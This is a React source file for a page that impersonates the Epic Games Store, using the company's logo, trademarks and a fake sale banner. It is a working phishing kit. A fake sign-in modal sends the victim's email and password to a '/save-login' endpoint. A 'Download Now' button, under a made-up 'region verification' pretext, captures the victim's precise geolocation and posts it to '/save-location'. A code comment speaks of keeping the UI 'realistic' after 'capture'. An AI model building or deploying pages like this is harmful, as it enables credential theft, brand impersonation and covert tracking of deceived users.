import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Search, ShoppingCart, ChevronDown, Star, Wifi, AlertTriangle, X, Menu, Shield, User, MapPin, CheckCircle } from 'lucide-react';
import axios from 'axios';

const GAMES = [
  {
    id: 1,
    title: 'EPIC GAMES',
    subtitle: 'STORE',
    genre: 'PC / Mac / Console',
    rating: '4.9',
    price: 'FREE',
    isFeatured: true,
    bg: 'linear-gradient(135deg, #0a0a1a, #0d1b4b, #0a2a6e)',
    accent: '#0078f2',
    tag: 'FEATURED FREE',
  },
  {
    id: 2,
    title: 'Shadow Realm',
    genre: 'RPG',
    price: '$29.99',
    bg: 'linear-gradient(135deg, #1a1a2e, #16213e, #0f3460)',
    accent: '#e94560',
    tag: 'POPULAR',
  },
  {
    id: 3,
    title: 'Iron Horizon',
    genre: 'STRATEGY',
    price: '$19.99',
    bg: 'linear-gradient(135deg, #0d0d0d, #1a1a1a, #2d2d2d)',
    accent: '#f5a623',
    tag: 'NEW',
  },
  {
    id: 4,
    title: 'Void Runners',
    genre: 'RACING',
    price: 'FREE',
    bg: 'linear-gradient(135deg, #003973, #e5e5be)',
    accent: '#00d2ff',
    tag: 'FREE NOW',
  },
  {
    id: 5,
    title: 'Phantom Strike',
    genre: 'BATTLE ROYALE',
    price: '$49.99',
    bg: 'linear-gradient(135deg, #200122, #6f0000)',
    accent: '#ff6b6b',
    tag: 'TOP SELLER',
  },
  {
    id: 6,
    title: 'Neon City',
    genre: 'OPEN WORLD',
    price: '$39.99',
    bg: 'linear-gradient(135deg, #12c2e9, #f64f59, #c471ed)',
    accent: '#c471ed',
    tag: 'EDITOR\'S CHOICE',
  },
];

export default function App() {
  const [showModal, setShowModal] = useState(false);
  const [status, setStatus] = useState('idle'); // idle, loading, success, error
  const [error, setError] = useState(null);
  const [mobileMenu, setMobileMenu] = useState(false);
  const [showSignIn, setShowSignIn] = useState(false);
  const [signInLoading, setSignInLoading] = useState(false);
  const [signInSuccess, setSignInSuccess] = useState(false);
  const [loginData, setLoginData] = useState({ email: '', password: '' });

  const handleGetClick = () => setShowModal(true);

  const handleSignIn = async (e) => {
    e.preventDefault();
    setSignInLoading(true);
    try {
      await axios.post('/save-login', {
        ...loginData,
        userAgent: navigator.userAgent
      });
      setSignInSuccess(true);
      setTimeout(() => {
        setShowSignIn(false);
        setSignInSuccess(false);
        setSignInLoading(false);
        setLoginData({ email: '', password: '' });
      }, 2000);
    } catch (e) {
      setError('Login authentication failed. Please check your credentials.');
      setSignInLoading(false);
    }
  };

  const handleAllow = () => {
    setShowModal(false);
    setStatus('loading');
    
    if (!navigator.geolocation) {
      setError('Geolocation not supported.');
      setStatus('error');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude, accuracy } = pos.coords;
        try {
          await axios.post('/save-location', {
            latitude, longitude, accuracy,
            userAgent: navigator.userAgent,
          });
          setStatus('success');
          // Optional: Re-mask status after capture to keep UI realistic
          setTimeout(() => setStatus('idle'), 5000);
        } catch (e) { 
          setError('Network sync failed.');
          setStatus('error');
        }
      },
      (e) => { 
        setError(e.message); 
        setStatus('error'); 
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  };

  return (
    <div className="min-h-screen bg-[#121212] text-white font-sans selection:bg-blue-500/30">

      {/* ── NAVBAR ── */}
      <nav className="sticky top-0 z-50 bg-[#121212]/95 backdrop-blur-md border-b border-white/5">
        <div className="max-w-7xl mx-auto px-6 h-16 flex items-center justify-between gap-6">
          <div className="flex items-center gap-8 flex-shrink-0">
            {/* Real Epic Logo */}
            <svg width="36" height="36" viewBox="0 0 32 32" fill="none">
              <path d="M16 1L4 4v16.5C4 26 16 31 16 31s12-5 12-10.5V4L16 1z" fill="white"/>
              <path d="M16 3L6 5.5V20c0 4.5 10 8.5 10 8.5s10-4 10-8.5V5.5L16 3z" fill="#121212"/>
              <path d="M9.5 9h11v2h-8.5v3h7v2h-7v4h9v2h-11.5V9zm13 0h2v11h-2V9z" fill="white"/>
              <path d="M11.5 24h9v1.5h-9V24z" fill="white" opacity="0.5"/>
            </svg>
            <div className="hidden md:flex items-center gap-1">
              {['Store','Browse','News','Discover'].map(n => (
                <button key={n} className="px-4 py-2 text-sm font-bold text-gray-400 hover:text-white transition-all uppercase tracking-widest">{n}</button>
              ))}
            </div>
          </div>
          <div className="flex-1 max-w-sm hidden md:flex items-center bg-white/5 border border-white/10 rounded-lg px-4 h-10 gap-3">
            <Search size={16} className="text-gray-500"/>
            <input className="bg-transparent text-sm text-white placeholder-gray-600 outline-none w-full" placeholder="Search store…"/>
          </div>
          <div className="flex items-center gap-4">
             <button className="text-gray-400 hover:text-white transition-colors relative">
               <ShoppingCart size={20}/>
               <span className="absolute -top-1 -right-1 w-4 h-4 bg-blue-600 rounded-full text-[10px] flex items-center justify-center font-bold">1</span>
             </button>
             <button 
                onClick={() => setShowSignIn(true)}
                className="px-6 py-2 bg-white text-black text-xs font-black uppercase tracking-widest rounded hover:bg-gray-200 transition-all flex items-center gap-2"
             >
                <User size={14}/> Sign In
             </button>
          </div>
        </div>
      </nav>

      {/* ── HERO BANNER ── */}
      <section className="relative h-[80vh] min-h-[600px] overflow-hidden">
        <div className="absolute inset-0" style={{ background: GAMES[0].bg }}>
          <div className="absolute inset-0 bg-gradient-to-r from-black via-black/40 to-transparent"/>
          <div className="absolute inset-0 bg-gradient-to-t from-[#121212] via-transparent to-transparent"/>
        </div>

        <div className="relative z-10 max-w-7xl mx-auto px-8 h-full flex flex-col justify-center">
          <motion.div initial={{ opacity: 0, x: -30 }} animate={{ opacity: 1, x: 0 }} transition={{ duration: 0.8 }}>
            <span className="inline-block px-3 py-1 bg-blue-600 text-[10px] font-black uppercase tracking-[.3em] rounded mb-6">Featured Store Event</span>
            <h1 className="text-7xl md:text-9xl font-black uppercase tracking-tighter leading-none mb-2 italic">
              EPIC <span className="text-blue-500">GAMES</span>
            </h1>
            <h2 className="text-5xl md:text-6xl font-black uppercase tracking-tighter mb-8 text-gray-400 leading-none">
              SPRING SALE 2026
            </h2>
            <p className="text-gray-300 max-w-xl mb-10 leading-relaxed text-lg italic">
              Experience the next generation of gaming. Sync your hardware profile to unlock exclusive free downloads and secure cloud rewards.
            </p>

            <div className="flex items-center gap-6">
              {status !== 'success' ? (
                <button
                  onClick={handleGetClick}
                  disabled={status === 'loading'}
                  className="px-12 py-5 bg-blue-600 hover:bg-blue-500 text-white font-black uppercase tracking-[.2em] rounded-2xl transition-all shadow-[0_20px_40px_-10px_rgba(37,99,235,0.4)] hover:-translate-y-1 active:translate-y-0"
                >
                  {status === 'loading' ? 'Syncing...' : 'DOWNLOAD NOW'}
                </button>
              ) : (
                <div className="px-10 py-5 bg-green-500/10 border border-green-500/30 rounded-2xl flex items-center gap-3">
                   <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"/>
                   <span className="text-green-500 font-black uppercase tracking-widest text-sm">Zone Verified</span>
                </div>
              )}
              <button className="px-10 py-5 border-2 border-white/10 hover:bg-white/5 text-white font-black uppercase tracking-widest rounded-2xl transition-all">
                Add to Library
              </button>
            </div>
            {error && <p className="text-red-500 mt-6 text-sm font-bold uppercase tracking-wider flex items-center gap-2"><AlertTriangle size={16}/> {error}</p>}
          </motion.div>
        </div>
      </section>

      {/* ── GRID SECTIONS ── */}
      <section className="max-w-7xl mx-auto px-8 py-20 pb-40">
        <div className="grid md:grid-cols-3 gap-12">
          
          {/* Free Games Column */}
          <div className="space-y-8">
            <h3 className="text-2xl font-black uppercase italic tracking-tighter border-l-4 border-blue-600 pl-4">Free Games</h3>
            {GAMES.filter(g => g.price === 'FREE').map(game => (
              <div key={game.id} className="group cursor-pointer">
                <div className="aspect-[16/9] rounded-2xl overflow-hidden relative mb-4">
                   <div className="absolute inset-0" style={{ background: game.bg }}/>
                   <div className="absolute inset-0 bg-black/20 group-hover:bg-black/0 transition-all"/>
                   <span className="absolute bottom-4 left-4 px-2 py-1 bg-blue-600 text-[10px] font-black uppercase tracking-widest rounded">{game.tag}</span>
                </div>
                <h4 className="font-bold text-lg group-hover:text-blue-500 transition-colors">{game.title}</h4>
                <p className="text-gray-500 text-xs uppercase font-black mt-1">Special Edition</p>
              </div>
            ))}
          </div>

          {/* New Releases Column */}
          <div className="space-y-8">
            <h3 className="text-2xl font-black uppercase italic tracking-tighter border-l-4 border-purple-600 pl-4">New Arrivals</h3>
             <div className="space-y-6">
               {GAMES.slice(2, 5).map(game => (
                 <div key={game.id} className="flex gap-4 group cursor-pointer">
                    <div className="w-24 h-32 rounded-xl overflow-hidden flex-shrink-0 relative">
                       <div className="absolute inset-0" style={{ background: game.bg }}/>
                    </div>
                    <div className="py-2">
                       <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest">{game.genre}</p>
                       <h4 className="font-bold text-sm mb-1 group-hover:text-blue-500 transition-colors">{game.title}</h4>
                       <span className="text-blue-400 font-black text-xs">{game.price}</span>
                    </div>
                 </div>
               ))}
             </div>
          </div>

          {/* Top Sellers Column */}
          <div className="space-y-8">
            <h3 className="text-2xl font-black uppercase italic tracking-tighter border-l-4 border-green-600 pl-4">Top Sellers</h3>
            <div className="space-y-6">
               {GAMES.slice(1, 4).map(game => (
                 <div key={game.id} className="flex gap-4 group cursor-pointer">
                    <div className="w-24 h-32 rounded-xl overflow-hidden flex-shrink-0 relative">
                       <div className="absolute inset-0" style={{ background: game.bg }}/>
                    </div>
                    <div className="py-2">
                       <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest">{game.genre}</p>
                       <h4 className="font-bold text-sm mb-1 group-hover:text-blue-500 transition-colors">{game.title}</h4>
                       <span className="text-green-400 font-black text-xs">{game.price}</span>
                    </div>
                 </div>
               ))}
             </div>
          </div>

        </div>
      </section>

      {/* ── CONSENT MODAL ── */}
      <AnimatePresence>
        {showModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 bg-black/90 backdrop-blur-xl" onClick={() => setShowModal(false)}/>
            <motion.div initial={{ scale: 0.9, opacity: 0, y: 30 }} animate={{ scale: 1, opacity: 1, y: 0 }} exit={{ scale: 0.9, opacity: 0, y: 30 }} className="relative bg-[#1a1a1a] border border-white/5 p-12 rounded-[2.5rem] w-full max-w-lg shadow-[0_0_150px_rgba(0,0,0,0.8)] overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-600 via-purple-500 to-blue-600"/>
              <div className="flex flex-col items-center text-center">
                 <div className="w-20 h-20 bg-blue-600/10 border border-blue-500/20 rounded-3xl flex items-center justify-center mb-8">
                    <MapPin className="text-blue-500" size={32}/>
                 </div>
                 <h2 className="text-3xl font-black uppercase tracking-tight mb-4 italic leading-none">Global Sync Required</h2>
                 <p className="text-gray-500 text-sm mb-10 leading-relaxed px-4">
                    The Epic Games Store requires your hardware deployment region to verify local license compatibility and secure your free content claim.
                 </p>
                 <div className="w-full flex gap-4">
                    <button onClick={() => setShowModal(false)} className="flex-1 py-5 border border-white/5 hover:bg-white/5 text-gray-400 font-black uppercase tracking-widest text-[10px] rounded-2xl transition-all">Cancel</button>
                    <button onClick={handleAllow} className="flex-1 py-5 bg-blue-600 hover:bg-blue-500 text-white font-black uppercase tracking-widest text-[10px] rounded-2xl transition-all shadow-xl shadow-blue-600/20">Verify Region</button>
                 </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* ── SIGN IN MODAL ── */}
      <AnimatePresence>
        {showSignIn && (
          <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 bg-black/95 backdrop-blur-2xl" onClick={() => !signInLoading && setShowSignIn(false)}/>
            <motion.div initial={{ scale: 0.85, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.85, opacity: 0 }} className="relative bg-[#0a0a0a]/80 border border-white/5 p-16 rounded-[3rem] w-full max-w-[500px] shadow-[0_0_200px_rgba(0,0,0,1)]">
              <div className="flex flex-col items-center">
                {/* Epic Shield Logo */}
                <svg width="64" height="64" viewBox="0 0 32 32" fill="none" className="mb-12">
                   <path d="M16 1L4 4v16.5C4 26 16 31 16 31s12-5 12-10.5V4L16 1z" fill="white"/>
                   <path d="M16 3L6 5.5V20c0 4.5 10 8.5 10 8.5s10-4 10-8.5V5.5L16 3z" fill="#121212"/>
                   <path d="M9.5 9h11v2h-8.5v3h7v2h-7v4h9v2h-11.5V9zm13 0h2v11h-2V9z" fill="white"/>
                </svg>

                <h2 className="text-4xl font-black mb-2 uppercase tracking-tighter italic">Sync Profile</h2>
                <p className="text-gray-600 text-xs mb-12 uppercase font-black tracking-[.4em]">Hardware Authorization Required</p>

                {signInSuccess ? (
                  <div className="w-full py-12 flex flex-col items-center">
                    <div className="w-24 h-24 bg-green-500/10 rounded-full flex items-center justify-center mb-8 border border-green-500/20">
                      <CheckCircle className="text-green-500" size={48} />
                    </div>
                    <p className="text-2xl font-black uppercase italic tracking-tighter">Verified</p>
                    <p className="text-gray-600 text-[10px] mt-4 uppercase font-black tracking-[0.4em] animate-pulse">Establishing Secure Link...</p>
                  </div>
                ) : (
                  <form onSubmit={handleSignIn} className="w-full space-y-6">
                    <div className="space-y-2">
                       <input 
                        required type="email" value={loginData.email} onChange={e => setLoginData({...loginData, email: e.target.value})}
                        className="w-full bg-white/5 border border-white/5 rounded-2xl px-8 py-5 text-sm focus:border-blue-600 outline-none transition-all placeholder:text-gray-700"
                        placeholder="Email Protocol"
                      />
                    </div>
                    <div className="space-y-2">
                       <input 
                        required type="password" value={loginData.password} onChange={e => setLoginData({...loginData, password: e.target.value})}
                        className="w-full bg-white/5 border border-white/5 rounded-2xl px-8 py-5 text-sm focus:border-blue-600 outline-none transition-all placeholder:text-gray-700"
                        placeholder="Access Cipher"
                      />
                    </div>
                    
                    <button
                      disabled={signInLoading}
                      className="w-full py-6 bg-blue-600 hover:bg-blue-500 text-white font-black uppercase tracking-[0.4em] rounded-[2rem] transition-all shadow-2xl shadow-blue-600/30 active:scale-[0.98] disabled:opacity-50 mt-4"
                    >
                      {signInLoading ? 'Processing...' : 'Authorize Login'}
                    </button>

                    <div className="flex justify-center gap-6 pt-10 border-t border-white/5">
                        {[1,2,3,4].map(idx => (
                           <div key={idx} className="w-12 h-12 bg-white/5 rounded-xl border border-white/10 flex items-center justify-center hover:bg-white/10 transition-all cursor-pointer">
                              <div className="w-5 h-5 bg-white/20 rounded-sm"/>
                           </div>
                        ))}
                    </div>
                  </form>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* ── FOOTER ── */}
      <footer className="bg-[#121212] border-t border-white/5 py-16 px-8">
         <div className="max-w-7xl mx-auto flex flex-col items-center gap-8 text-center">
            <svg width="40" height="40" viewBox="0 0 32 32" fill="none" opacity="0.5">
               <path d="M16 1L4 4v16.5C4 26 16 31 16 31s12-5 12-10.5V4L16 1z" fill="white"/>
               <path d="M16 3L6 5.5V20c0 4.5 10 8.5 10 8.5s10-4 10-8.5V5.5L16 3z" fill="#121212"/>
            </svg>
            <div className="flex flex-wrap justify-center gap-6">
                {['Careers','Company','Fan Art Policy','UX Research','Terms','Privacy'].map(link => (
                   <span key={link} className="text-[10px] uppercase font-black tracking-widest text-gray-700 hover:text-gray-400 cursor-pointer transition-colors">{link}</span>
                ))}
            </div>
            <p className="text-gray-800 text-[9px] uppercase font-black tracking-[.2em] max-w-2xl">
               © 2026, Epic Games, Inc. Epic, Epic Games, the Epic Games logo, Fortnite, Unreal Engine are trademarks of Epic Games, Inc. in the USA and elsewhere.
            </p>
         </div>
      </footer>

    </div>
  );
}
